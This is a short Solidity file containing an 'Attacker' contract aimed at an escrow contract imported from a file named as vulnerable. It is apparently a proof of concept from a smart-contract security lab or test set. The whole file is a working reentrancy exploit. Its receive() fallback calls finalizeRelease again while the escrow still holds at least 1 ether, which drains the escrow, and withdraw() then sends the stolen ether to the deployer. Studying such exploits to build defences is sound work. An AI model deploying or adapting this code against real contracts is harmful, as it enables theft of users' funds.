// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./New_StateMachineDependency_Vulnerable.sol";

contract Attacker {
    FragileEscrow public escrow;
    address public owner;

    constructor(address escrowAddress) {
        escrow = FragileEscrow(escrowAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        escrow.deposit{value: msg.value}();
        escrow.lockForProcessing(address(this));
        escrow.finalizeRelease(address(this));
    }

    receive() external payable {
        if (address(escrow).balance >= 1 ether) {
            escrow.finalizeRelease(address(this));
        }
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
